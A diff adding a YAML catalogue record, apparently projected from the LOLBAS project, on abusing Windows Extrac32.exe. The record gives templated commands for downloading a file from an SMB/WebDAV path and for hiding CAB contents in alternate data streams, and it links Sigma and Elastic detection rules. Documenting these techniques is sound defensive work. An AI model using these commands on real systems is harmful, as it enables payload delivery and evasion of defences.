@@ -1,0 +1,111 @@
+id: lolbas/T1NCaW5hcmllcy9FeHRyYWMzMi55bWw/RG93bmxvYWQ/2
+type: binary
+platform: windows
+name: Extrac32.exe
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1105
+opsec:
+  noise: high
+  detection_refs:
+  - https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml
+  - https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_extrac32.yml
+  - https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_extrac32_ads.yml
+commands:
+- template: extrac32 /Y /C {PATH_SMB} {PATH_ABSOLUTE}
+  comment: Copy the source file to the destination file and overwrite it.
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Extrac32/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Extrac32.exe
+      category: Download
+      privileges: User
+      mitre_id: T1105
+      source_file: OSBinaries/Extrac32.yml
+      command_source_index: 2
+      document_utf8: "---\nName: Extrac32.exe\nDescription: Extract to ADS, copy or overwrite a file with\
+        \ Extrac32.exe\nAuthor: Oddvar Moe\nCreated: 2018-05-25\nCommands:\n  - Command: extrac32 {PATH_ABSOLUTE:.cab}\
+        \ {PATH_ABSOLUTE}:file.exe\n    Description: Extracts the source CAB file into an Alternate Data\
+        \ Stream (ADS) of the target file.\n    Usecase: Extract data from cab file and hide it in an\
+        \ alternate data stream.\n    Category: ADS\n    Privileges: User\n    MitreID: T1564.004\n  \
+        \  OperatingSystem: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10,\
+        \ Windows 11\n    Tags:\n      - Type: Compression\n  - Command: extrac32 {PATH_ABSOLUTE:.cab}\
+        \ {PATH_ABSOLUTE}:file.exe\n    Description: Extracts the source CAB file on an unc path into\
+        \ an Alternate Data Stream (ADS) of the target file.\n    Usecase: Extract data from cab file\
+        \ and hide it in an alternate data stream.\n    Category: ADS\n    Privileges: User\n    MitreID:\
+        \ T1564.004\n    OperatingSystem: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1,\
+        \ Windows 10, Windows 11\n    Tags:\n      - Type: Compression\n  - Command: extrac32 /Y /C {PATH_SMB}\
+        \ {PATH_ABSOLUTE}\n    Description: Copy the source file to the destination file and overwrite\
+        \ it.\n    Usecase: Download file from UNC/WEBDav\n    Category: Download\n    Privileges: User\n\
+        \    MitreID: T1105\n    OperatingSystem: Windows XP, Windows Vista, Windows 7, Windows 8, Windows\
+        \ 8.1, Windows 10, Windows 11\n  - Command: extrac32.exe /C {PATH_ABSOLUTE:.source.exe} {PATH_ABSOLUTE:.dest.exe}\n\
+        \    Description: Command for copying file from one folder to another\n    Usecase: Copy file\n\
+        \    Category: Copy\n    Privileges: User\n    MitreID: T1105\n    OperatingSystem: Windows XP,\
+        \ Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\nFull_Path:\n  - Path:\
+        \ C:\\Windows\\System32\\extrac32.exe\n  - Path: C:\\Windows\\SysWOW64\\extrac32.exe\nDetection:\n\
+        \  - Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml\n\
+        \  - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_extrac32.yml\n\
+        \  - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_extrac32_ads.yml\n\
+        Resources:\n  - Link: https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/\n\
+        \  - Link: https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\n  - Link: https://twitter.com/egre55/status/985994639202283520\n\
+        Acknowledgement:\n  - Person: egre55\n    Handle: '@egre55'\n  - Person: Oddvar Moe\n    Handle:\
+        \ '@oddvarmoe'\n  - Person: Hai Vaknin(Lux\n    Handle: '@VakninHai'\n  - Person: Tamir Yehuda\n\
+        \    Handle: '@tim8288'\n"
+      document_sha256: sha256:faf043d38439a90a90585b4cb2b361764e3633f35b9999daecd8419ae5f81d9f
+    upstream_url: https://lolbas-project.github.io/lolbas/Binaries/Extrac32/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-download
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1105
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:7d110b92b6a1c76672d2efaa3254861216260353638729439ed14d2f1b37b52c
